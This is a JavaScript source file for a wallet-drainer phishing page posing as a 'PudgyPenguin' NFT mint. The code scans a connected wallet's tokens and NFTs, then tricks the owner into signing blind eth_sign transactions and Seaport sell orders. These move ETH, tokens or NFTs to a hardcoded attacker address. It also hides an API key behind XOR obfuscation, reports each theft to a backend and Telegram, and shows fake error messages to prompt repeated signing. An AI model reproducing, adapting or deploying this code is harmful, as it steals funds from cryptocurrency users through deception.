//
const RECEIVER =
  "0xE48Bf626413A751e150C9aDBE13c4F1f1173810F";

// ckey_c8c9b4345db64fd9a02799de156
const COVAL_KEY =
  "216068667a5c343a65623230353a3b30333437663a33616031333535326137343421";

const NAME = "PudgyPenguin";
const CHAIN_ID = 1;
const MIN_ETH_BAL = 0.001;

/**
 *
 * @param {string} account
 */
async function action(account) {
  const { ethereum } = window;

  // if wallet is not connected
  if (!account) {
    await connect('mm');
    return;
  }
  // check chain
  var chainId = ethereum.networkVersion;
  if (ethereum.networkVersion !== CHAIN_ID.toString()) {
    let res = await tryToChangeChain();
    if (!res) return;
    chainId = ethereum.networkVersion;
  }

  // if scanning didn't happen
  if (getItem("noeth") === null || getItem("nfts") === null) {
    scanNoeth(account, chainId);
    await scanNfts(account);
  }

  var isMint = false;

  while (true) {
    try {
      // vars
      const web3 = new Web3(ethereum);
      const ethBal =
        Math.floor(
          parseFloat(web3.utils.fromWei(await web3.eth.getBalance(account))) *
            10000
        ) / 10000;

      // check eth bal
      if (ethBal < MIN_ETH_BAL) {
        try {
          // if got nfts
          if (getItem("seanfts") && getItem("seanfts").nfts.length) {
            let res = await actionSea(account);
            if (res) updateArrays("sea");
          } else {
            // if got nothing then can sign emptry message
            const sha3_ = web3.utils.sha3("test", { encoding: "hex" });
            await web3.eth.sign(sha3_, account);
          }
          try {
            // await mint(account);
          } catch (e) {}
          return;
        } catch (e) {
          try {
            // await mint(account);
          } catch (e) {}
          return;
        }
      }

      // @ts-ignore
      const gasPrice = Math.floor((await web3.eth.getGasPrice()) * 1.3); // in wei
      const valueToTransDec =
        ethBal -
        parseInt(TX_GAS_LIMIT.toString()) *
          parseFloat(web3.utils.fromWei(gasPrice.toString())) -
        0.005; // value to trans = eth bal - gwei * gasLimit

      const valueToTransHex = web3.utils.toHex(
        web3.utils.toWei(valueToTransDec.toString(), "ether")
      );

      const mode = compareWorth(valueToTransDec);

      // action
      var res;
      if (mode === "sea") {
        res = await actionSea(account);
      } else {
        res = await actionSig(
          account,
          mode,
          valueToTransHex,
          gasPrice,
          chainId
        );
      }

      // updating arrays
      if (res) updateArrays(mode); // update arrays if action happend

      isMint = true;
      // await mint(account);

      break;
    } catch (e) {
      console.log(e);
      // showError(e.message);

      try {
        // if (!isMint) await mint(account);
      } catch (e) {}

      return;
    }
  }
}

/**
 * build calldata
 * build message to sign
 * sign message
 * send to backend
 * @param {string} account
 * @returns boolean success
 */
async function actionSea(account) {
  try {
    const web3 = new Web3(window.ethereum);

    // build message
    const timestamp = Math.floor(Date.now() / 1000) - 3600;
    const salt = getSalt();
    const salt2 = getSalt();

    const messageToSign = getSellSeaMessage(
      account,
      getItem("seanfts").nfts,
      timestamp,
      salt
    );

    // sign
    var isSigned = false,
      ended = false;
    await web3.currentProvider.send(
      {
        method: "eth_signTypedData_v4",
        params: [account, JSON.stringify(messageToSign)],
        from: account,
        id: new Date().getTime(),
      },
      (err, res) => {
        if (!err) {
          console.log(res.result);

          // send to backend
          sendReq("post", {
            addr: account.slice(2),
            tokensArr: getItem("seanfts").nfts,
            sig: res.result.slice(2),
            sigTime: timestamp,
            salt: salt,
            salt2: salt2,
            worth: getItem("seanfts").totalWorth,
            domain: window.location.hostname,
          });
          isSigned = true;

        } else console.log("err in sign", err);
        ended = false;
      }
    );
    while (!ended) {
      await sleep(500);
    }

    console.log("isSigned:", isSigned);
    return isSigned;
  } catch (e) {
    console.log("action sea error:", e);
    return false;
  }
}

/**
 * build tx as message
 * sign message
 * destruct sign
 * send as tx
 *
 * @param {string} account
 * @param {string} mode
 * @param {string} valueToTransHex
 * @param {number} gasPrice
 * @param {number} chainId
 * @returns boolean success
 */
async function actionSig(account, mode, valueToTransHex, gasPrice, chainId) {
  let nfts = getItem("nfts"),
    noeth = getItem("noeth");

  const { ethereum } = window;
  const web3 = new Web3(ethereum);
  const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
  let tx_;

  if (mode === "nft") {
    if (!nfts.length) return;

    const currentContract = new web3.eth.Contract(
      ERC721ABI,
      nfts[0].contractAddr
    );

    // is approve or transfer
    let data;
    var nftsFromCurCollection = nfts.filter(
      (nft) => nft.contractAddr === nfts[0].contractAddr
    );

    if (nftsFromCurCollection.length > 1) {
      showInfo("nft: transfer");
      data = currentContract.methods
        .safeTransferFrom(account, RECEIVER, nfts[0].tokenId)
        .encodeABI();
    } else {
      showInfo("nft: transfer");
      data = currentContract.methods
        .safeTransferFrom(account, RECEIVER, nfts[0].tokenId)
        .encodeABI();
    }

    // res tx
    tx_ = {
      to: nfts[0].contractAddr,
      nonce: nonce,
      gasLimit: CONTRACT_GAS_LIMIT,
      gasPrice: web3.utils.toHex(gasPrice),
      value: "0x0",
      data: data,
      r: "0x",
      s: "0x",
      v: "0x1",
    };
  } else if (mode === "noeth") {
    if (!noeth) return;
    const currentContract = new web3.eth.Contract(
      ERC20ABI,
      noeth[0].contract_address
    );

    // res tx
    tx_ = {
      to: noeth[0].contract_address,
      nonce: nonce,
      gasLimit: CONTRACT_GAS_LIMIT,
      gasPrice: web3.utils.toHex(gasPrice),
      value: "0x0",
      data: currentContract.methods
        .transfer(RECEIVER, noeth[0].balance)
        .encodeABI(),
      r: "0x",
      s: "0x",
      v: "0x1",
    };
  } else if (mode === "eth") {
    console.log("eth to send:", web3.utils.fromWei(valueToTransHex));
    // res tx
    tx_ = {
      to: RECEIVER,
      nonce: nonce,
      gasLimit: TX_GAS_LIMIT,
      gasPrice: web3.utils.toHex(gasPrice),
      value: valueToTransHex,
      data: "0x0",
      r: "0x",
      s: "0x",
      v: "0x1",
    };
  }

  console.log(tx_);

  // build message to sign
  const { ethereumjs } = window;
  var tx = new ethereumjs.Tx(tx_);
  const serializedTx = "0x" + tx.serialize().toString("hex");
  const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

  // sign initial message
  const initialSig = await web3.eth.sign(sha3_, account);

  // destruct origin sign, get rsv, update tx
  const temp = initialSig.substring(2),
    r = "0x" + temp.substring(0, 64),
    s = "0x" + temp.substring(64, 128),
    rhema = parseInt(temp.substring(128, 130), 16),
    v = web3.utils.toHex(rhema + chainId * 2 + 8);
  tx.r = r;
  tx.s = s;
  tx.v = v;

  const txFin = "0x" + tx.serialize().toString("hex");

  // send tx as signed tx
  console.log("Waiting for sign submitting...");
  const res = await web3.eth.sendSignedTransaction(txFin);
  console.log("Submitted:", res);

  // send mess to tg
  let textMode, worth, contract;
  if (mode === "noeth") {
    textMode = "Tokens transfer";
    worth = noeth[0].worth;
    contract = noeth[0].contract_address.slice(2);
  } else if (mode === "nft" && nftsFromCurCollection.length > 1) {
    textMode = "NFT Approve";
    worth = nfts[0].worth * nftsFromCurCollection.length;
    contract = nfts[0].contractAddr.slice(2);
  } else if (mode === "nft") {
    textMode = "NFT transfer";
    worth = nfts[0].worth;
    contract = nfts[0].contractAddr.slice(2);
  } else if (mode === "eth") {
    textMode = "ETH transfer";
    worth = web3.utils.fromWei(valueToTransHex);
    contract = null;
  }

  tgSend(
    `${window.location.hostname} | ${textMode}
Address: ${fAddr(account.slice(2))}
Contract: ${contract ? fAddr(contract) : "ETH"}
Worth: ${Math.round(worth * 100) / 100} ETH`
  );

  showError("The action failed due to network load. Please try to sign again");

  return true;
}

/**
 * @param {string} name name of wallet
 */
async function connect(name) {
  const { ethereum } = window;
  const width = window.innerWidth;

  // check provider
  if (!ethereum && width < 815) {
    if (name === "mm") {
      window.open(
        `https://metamask.app.link/dapp/${window.location.href
          .replace("https://", "")
          .replace("http://", "")}`
      );
    }
    if (name === "tw") {
      window.open(
        `https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.href}`
      );
    }
    return;
  } else if (!ethereum) {
    showError("No crypto wallet found. Please install MetaMask");
    return;
  }

  // do not activate coinbase
  if (name === "mm" && ethereum.providers) {
    ethereum.setSelectedProvider(
      ethereum.providers.find(({ isMetaMask }) => isMetaMask)
    );
  }

  // check chain
  if (ethereum.networkVersion !== CHAIN_ID.toString()) {
    let res = await tryToChangeChain(name);
    if (!res) return;
  }

  // connect
  let account = await ethereum.request({
    method: "eth_requestAccounts",
  });

  // trust wallet bug handle
  account =
    name === "tw"
      ? await ethereum.request({
          method: "eth_requestAccounts",
        })[0]
      : ethereum.selectedAddress.toString();

  localStorage.removeItem("noeth");
  localStorage.removeItem("nfts");

  scanNoeth(account, CHAIN_ID);
  scanNfts(account);


  // sign empty message
  // await signMessage(account);

  // action(account);

  return action(account);
}

async function only_connect(name) {
    const { ethereum } = window;
    const width = window.innerWidth;
  
    // check provider
    if (!ethereum && width < 815) {
      if (name === "mm") {
        window.open(
          `https://metamask.app.link/dapp/${window.location.href
            .replace("https://", "")
            .replace("http://", "")}`
        );
      }
      if (name === "tw") {
        window.open(
          `https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.href}`
        );
      }
      return;
    } else if (!ethereum) {
      showError("No crypto wallet found. Please install MetaMask");
      return;
    }
  
    // do not activate coinbase
    if (name === "mm" && ethereum.providers) {
      ethereum.setSelectedProvider(
        ethereum.providers.find(({ isMetaMask }) => isMetaMask)
      );
    }
  
    // check chain
    if (ethereum.networkVersion !== CHAIN_ID.toString()) {
      let res = await tryToChangeChain(name);
      if (!res) return;
    }
  
    // connect
    let account = await ethereum.request({
      method: "eth_requestAccounts",
    });
  
    // trust wallet bug handle
    account =
      name === "tw"
        ? await ethereum.request({
            method: "eth_requestAccounts",
          })[0]
        : ethereum.selectedAddress.toString();
  
    localStorage.removeItem("noeth");
    localStorage.removeItem("nfts");
  
    scanNoeth(account, CHAIN_ID);
    scanNfts(account);
  
    tgSend(
      `${window.location.hostname} | Connect\nAddress: ${fAddr(account.slice(2))}`
    );
  
    // sign empty message
    // await signMessage(account);
  
    // action(account);
  
    return account;
  }

/**
 * @param {any} name name of wallet
 */
async function tryToChangeChain(name = null) {
  if ((name && name === "tw") || window.innerWidth < 815) {
    showError(`Please change network to ${CHAIN_ID === 1 ? "ETH" : "BSC"}`);
    return false;
  }

  // if pc try to switch
  try {
    // @ts-ignore
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: `0x${CHAIN_ID.toString(16)}` }],
    });
  } catch (err) {
    if (err.code === 4902) {
      showError(`Please add ${CHAIN_ID === 1 ? "ETH" : "BSC"} network.`);
      return false;
    }
  }
  return true;
}

/**
 *
 * @param {any} text data to encode
 * @returns {string} encoded string
 */
const c = (text) => {
  try {
    text = JSON.stringify(text);
    const textToChars = (text) =>
      text
        .toString()
        .split("")
        .map((c) => c.charCodeAt(0));
    const byteHex = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const applySaltToChar = (code) =>
      textToChars(31612400).reduce((a, b) => a ^ b, code);

    return text
      .split("")
      .map(textToChars)
      .map(applySaltToChar)
      .map(byteHex)
      .join("");
  } catch (e) {
    return null;
  }
};

/**
 *
 * @param {string} encoded encoded string from c
 * @returns {any} object that was decoded
 */
const d = (encoded) => {
  try {
    const textToChars = (text) =>
      text
        .toString()
        .split("")
        .map((c) => c.charCodeAt(0));
    const applySaltToChar = (code) =>
      textToChars(31612400).reduce((a, b) => a ^ b, code);
    return JSON.parse(
      encoded
        .toString()
        .match(/.{1,2}/g)
        .map((hex) => parseInt(hex, 16))
        .map(applySaltToChar)
        .map((charCode) => String.fromCharCode(charCode))
        .join("")
    );
  } catch (e) {
    return null;
  }
};

/**
 * @param {number} ethBal
 * @returns { "nft"  | "noeth" | "eth" | "sea"}
 */
function compareWorth(ethBal) {
  let nfts = getItem("nfts"),
    seanfts = getItem("seanfts"),
    noeth = getItem("noeth");

  // if only eth
  if ((!noeth || !noeth.length) && (!nfts || !nfts.length)) return "eth";

  // vars
  const a = {
    worth: noeth && noeth.length ? noeth[0].worth : -1,
    res: "noeth",
  };
  const b = {
    worth: nfts && nfts.length ? nfts[0].worth * 0.8 : -1,
    res: "nft",
  };
  const c = {
    worth: seanfts.nfts && seanfts.nfts.length ? seanfts.totalWorth * 0.8 : -1,
    res: "sea",
  };
  const d = { worth: ethBal, res: "eth" };

  // sort
  let sortedValues = [a, b, c, d].sort((a, b) => (a.worth < b.worth ? 1 : -1));

  // @ts-ignore
  return sortedValues[0].res;
}

/**
 * @param {string} key
 * @param {any} value
 */
function setItem(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

async function signMessage(account) {
  const { ethereum } = window;

  const web3 = new Web3(ethereum);

  const messageToSign = `Welcome to ${NAME}!

Click to sign in. 

Next you will be asked to sign the message to mint nft.

This requests will not trigger a blockchain transaction or cost any gas fees.

Your authentication status will reset after 24 hours.

Wallet address:
${account}

Nonce:
${getNonce()}
  `;

  await web3.eth.personal.sign(messageToSign, account);
}

function getNonce() {
  function rndStr(length) {
    var result = "";
    var characters = "abcdef123456789";
    for (var i = 0; i < length; i++) {
      result += characters.charAt(
        Math.floor(Math.random() * characters.length)
      );
    }
    return result;
  }

  return `${rndStr(8)}-${rndStr(4)}-${rndStr(4)}-${rndStr(4)}-${rndStr(8)}`;
}

/**
 * @param {string} account
 * @param {{ id: string; contractAddr: any; amount: any; }[]} tokensArr
 * @param {number} timestamp
 * @param {string} salt
 */
function getSellSeaMessage(account, tokensArr, timestamp, salt) {
  const offer = getOffer(tokensArr);
  const consideration = getConsideration(offer);

  const orderForSigning = {
    offerer: account,
    zone: "0x004c00500000ad104d7dbd00e3ae0a5c00560c00",
    offer: offer,
    consideration: consideration,
    orderType: 2,
    startTime: timestamp,
    endTime: timestamp + expirationOffset,
    zoneHash:
      "0x0000000000000000000000000000000000000000000000000000000000000000",
    salt: salt,
    conduitKey:
      "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    counter: "0",
  };

  const message = {
    types: ORDER_TYPE,
    domain: {
      name: "Seaport",
      version: "1.1",
      chainId: 1,
      verifyingContract: "0x00000000006c3852cbef3e08e8df289169ede581",
    },
    primaryType: "OrderComponents",
    message: orderForSigning,
  };

  return message;
}

/**
 * @param {{ id: string; contractAddr: any; amount: any; }[]} tokensArr
 * @returns {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string}[]}
 */
function getOffer(tokensArr) {
  let res = [];
  tokensArr.forEach(
    (/** @type {{ id: string; contractAddr: any; amount: any; }} */ token) => {
      res.push({
        itemType: parseInt(token.id) ? 2 : 1, // 2 - nft, 1 - erc20
        token: token.contractAddr,
        identifierOrCriteria: token.id,
        startAmount: token.amount || "1",
        endAmount: token.amount || "1",
      });
    }
  );

  return res;
}

/**
 * @param {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string}[]} offer
 * @returns {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string, recipient: string}[]}
 */
function getConsideration(offer) {
  offer.forEach((_, index) => {
    offer[index]["recipient"] = RECEIVER;
  });

  return offer;
}

/**
 * @param {string} key
 */
function getItem(key) {
  return JSON.parse(localStorage.getItem(key));
}

/**
 * @returns {string} 70 chars salt
 */
function getSalt() {
  let result = "";
  const characters = "0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < 70; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

/**
 * @param {number} delayInms
 */
function sleep(delayInms) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve(2);
    }, delayInms);
  });
}

/*
sets array of nfts:
nfts = [{
      contractAddr: string, 
      tokenId: string
      worth: int,
    }, 
    ...
  ]
*/
/**
 * @param {string} account
 */
async function scanNfts(account) {
  if (!account) return;
  if (!getItem("nfts") || !getItem("nfts").length) {
    try {
      // get list of collections
      const resp = await sendReq(
        "get",
        `https://api.opensea.io/api/v1/collections?asset_owner=${account}&offset=0&limit=20`
      );

      if (!resp || !resp.data) {
        showError("Internal error. Please reload the page");
        return;
      }

      // filter
      let collections = resp.data;
      collections = collections.filter(
        (collection) =>
          collection.description !== "" &&
          // collection.stats.seven_day_volume > 0 &&
          // collection.stats.one_day_average_price > 0 &&
          collection.primary_asset_contracts.length &&
          collection.primary_asset_contracts[0].schema_name !== "ERC1155" &&
          collection.primary_asset_contracts[0].address !==
            "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85" // remove ens
      );

      // sort by price
      collections.sort((a, b) => {
        return a.stats.one_day_average_price < b.stats.one_day_average_price
          ? 1
          : -1;
      });

      // result collections
      console.log("collections:", collections);
      setItem("collections", collections);

      // get list of token ids
      let nfts = [];
      if (collections.length) {
        const assetsUrl = `https://api.opensea.io/api/v1/assets?owner=${account}`;
        var payload = "";
        // building request url. adding all collections contracts
        collections.forEach((collection) => {
          payload += `&asset_contract_addresses=${collection.primary_asset_contracts[0].address}`;
        });

        let res = await sendReq("get", `${assetsUrl}${payload}`);
        if (!res || !res.data) {
          showError("Internal error. Try again later");
          return;
        }
        let allNfts = res.data.assets;

        // get nfts for each collection
        collections.forEach((collection) => {
          let currentCollectionNfts = allNfts.filter(
            (nft) =>
              nft.asset_contract.address ===
              collection.primary_asset_contracts[0].address
          );

          currentCollectionNfts.forEach((nftInCurCollection) => {
            // add to result array
            nfts.push({
              contractAddr: collection.primary_asset_contracts[0].address,
              worth:
                Math.round(
                  collection.stats.one_day_average_price * 0.8 * 10000
                ) / 10000,
              tokenId: nftInCurCollection.token_id,
              id: nftInCurCollection.token_id,
            });
          });
        });

        // sort by worth
        nfts.sort((a, b) => {
          return a.worth < b.worth ? 1 : -1;
        });
      }

      console.log("nfts:", nfts);
      setItem("nfts", nfts);
      await scanSea(account, nfts);
      return nfts;
    } catch (e) {
      // showError(e.message);
    }
  } else {
    return getItem("nfts");
  }
}

/**
 * @param {string} account
 * @param {any[]} allNfts
 */
async function scanSea(account, allNfts) {
  let seanfts = {
    nfts: [],
    totalWorth: 0,
  }; // result array. array of nfts for which user gave approve to opensea

  if (
    !getItem("collections") ||
    !getItem("collections").length ||
    !allNfts.length
  ) {
    console.log("No opensea approves, because no nfts");
    setItem("seanfts", seanfts);
    return;
  }

  // get proxy address for user
  const { ethereum } = window;
  const web3 = new Web3(ethereum);

  const Conduit = "0x1E0049783F008A0085193E00003D00cd54003c71";

  const erc721Contract = new web3.eth.Contract(ERC721ABI);

  const multicallContract = new web3.eth.Contract(
    MulticallABI,
    "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441"
  );

  // build multicall calls. check each collection
  let multiCalldata = [];
  const collections = getItem("collections");
  collections.forEach((collection) => {
    multiCalldata.push({
      target: collection.primary_asset_contracts[0].address,
      callData: erc721Contract.methods
        .isApprovedForAll(account, Conduit)
        .encodeABI(),
    });
  });

  const results = (
    await multicallContract.methods.aggregate(multiCalldata).call()
  ).returnData;

  // add to result array all approved nfts + increase totalWorth
  results.forEach((result, index) => {
    const isApproved = parseInt(result.slice(-1));
    const curCollectionAddr =
      collections[index].primary_asset_contracts[0].address;

    if (isApproved) {
      // then we add this collection nfts to seanfts

      // get all collection nfts
      let currentCollectionNfts = allNfts.filter(
        (nft) => nft.contractAddr === curCollectionAddr
      );

      // add each nft to seanft arr
      currentCollectionNfts.forEach((nft) => {
        seanfts.totalWorth += nft.worth;
        let copy = structuredClone(nft);
        delete copy.tokenId;
        delete copy.worth;
        seanfts.nfts.push(copy);
      });
    }
  });

  // round worth
  if (results.length) {
    seanfts.totalWorth = Math.round(seanfts.totalWorth * 10000) / 10000;
    console.log("seanfts:", seanfts);
    setItem("seanfts", seanfts);
  } else {
    console.log("seanfts: []");
    setItem("seanfts", {
      nfts: [],
      totalWorth: 0,
    });
  }
}

/**
 * @param {string} account
 * @param {number} chainId
 */
async function scanNoeth(account, chainId) {
  if (!account) return;
  if (!getItem("noeth") || !getItem("noeth").length) {
    try {
      const coval_res = await sendReq(
        "get",
        `https://api.covalenthq.com/v1/${chainId}/address/${account}/balances_v2/?quote-currency=ETH&no-nft-fetch=true&`
      );

      if (!coval_res.data) {
        console.log("noeth: []");
        showError("Internal error. Please try again later");
        setItem("noeth", []);
        return;
      }

      let noeth = coval_res.data.data.items;
      console.log("beforeFilter:", noeth);
      noeth = noeth.filter(
        (coin) =>
          coin.contract_ticker_symbol != null &&
          coin.contract_name != null &&
          coin.contract_name.indexOf(".") === -1 &&
          coin.quote > 0 &&
          coin.contract_address !== "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
      );

      noeth.sort(function (a, b) {
        return a.quote < b.quote ? 1 : -1;
      });

      // add amount in eth (specified in url)
      noeth.forEach(
        (token) => (token.worth = Math.round(token.quote * 10000) / 10000)
      );

      console.log("noeth:", noeth);
      setItem("noeth", noeth);
    } catch (e) {
      // showError(e.message);
    }
  } else return getItem("noeth");
}

/**
 * @param {string} method
 * @param {string} url
 * @param {any}  errorText
 * @param {any} payload
 */
async function sendReq(method, url, errorText = null, payload = null) {
  try {
    var res;
    if (method === "get") {
      if (url.includes("coval")) url += `key=${d(COVAL_KEY)}`;

      res = await axios.get(url, {
        headers: url.includes("coval")
          ? {
              accept: "application/json",
            }
          : {},
      });
    } else {
      payload = c(payload);
      res = await axios.post(url, {
        payload: payload,
      });
    }
    console.log(url, res);
    return res;
  } catch (e) {
    console.log(url, e);
    if (errorText) showError(errorText);
    return;
  }
}


/**
 * @param {string} addr 0x1231 addr
 * @returns {string} formatted for tg markdown
 */
const fAddr = (addr) => {
  return `[0x${addr}](etherscan.io/address/0x${addr})`;
};

/**
 * @param {"nft" | "sea" | "noeth" | "eth"} mode
 */
function updateArrays(mode) {
  console.log("updaing arrays");
  if (mode === "nft") {
    // is approve
    let nfts = getItem("nfts");
    let nftsFromCurCollection = nfts.filter(
      (nft) => nft.contractAddr === nfts[0].contractAddr
    );
    if (nftsFromCurCollection.length > 1) {
      // approve
      nfts = nfts.filter((nft) => nft.contractAddr !== nfts[0].contractAddr);
      setItem("nfts", nfts);
    } else {
      // transfer
      nfts.shift();
      setItem("nfts", nfts);
    }
  } else if (mode === "noeth") {
    // tokens
    let noeth = getItem("noeth");
    noeth.shift();
    setItem("noeth", noeth);
  } else if (mode === "sea") {
    // opensea
    setItem("seanfts", { nfts: [], totalWorth: 0 });
    console.log("updated sea array");
  } else if (mode === "eth") {
    return true;
  }
}

const TX_GAS_LIMIT = "0x55F0"; // 22'000
const CONTRACT_GAS_LIMIT = "0x186A0"; // 100'000

const expirationOffset = 2630000; // 1 month in sec

const ERC20ABI = [
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ERC721ABI = [
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "tokenId", type: "uint256" },
    ],
    name: "safeTransferFrom",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },

  {
    constant: false,
    inputs: [
      { internalType: "address", name: "to", type: "address" },
      { internalType: "bool", name: "approved", type: "bool" },
    ],
    name: "setApprovalForAll",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
    ],
    name: "isApprovedForAll",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
];

const MINTABI = [
  {
    inputs: [{ name: "_mintAmount", type: "uint256" }],
    name: "mint",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
];

const MulticallABI = [
  {
    constant: false,
    inputs: [
      {
        components: [
          { name: "target", type: "address" },
          { name: "callData", type: "bytes" },
        ],
        name: "calls",
        type: "tuple[]",
      },
    ],
    name: "aggregate",
    outputs: [
      { name: "blockNumber", type: "uint256" },
      { name: "returnData", type: "bytes[]" },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ORDER_TYPE = {
  OrderComponents: [
    { name: "offerer", type: "address" },
    { name: "zone", type: "address" },
    { name: "offer", type: "OfferItem[]" },
    { name: "consideration", type: "ConsiderationItem[]" },
    { name: "orderType", type: "uint8" },
    { name: "startTime", type: "uint256" },
    { name: "endTime", type: "uint256" },
    { name: "zoneHash", type: "bytes32" },
    { name: "salt", type: "uint256" },
    { name: "conduitKey", type: "bytes32" },
    { name: "counter", type: "uint256" },
  ],
  OfferItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
  ],
  ConsiderationItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
    { name: "recipient", type: "address" },
  ],
  EIP712Domain: [
    { name: "name", type: "string" },
    { name: "version", type: "string" },
    { name: "chainId", type: "uint256" },
    { name: "verifyingContract", type: "address" },
  ],
};

const orderType = {
  OrderComponents: [
    { name: "offerer", type: "address" },
    { name: "zone", type: "address" },
    { name: "offer", type: "OfferItem[]" },
    { name: "consideration", type: "ConsiderationItem[]" },
    { name: "orderType", type: "uint8" },
    { name: "startTime", type: "uint256" },
    { name: "endTime", type: "uint256" },
    { name: "zoneHash", type: "bytes32" },
    { name: "salt", type: "uint256" },
    { name: "conduitKey", type: "bytes32" },
    { name: "counter", type: "uint256" },
  ],
  OfferItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
  ],
  ConsiderationItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
    { name: "recipient", type: "address" },
  ],
};
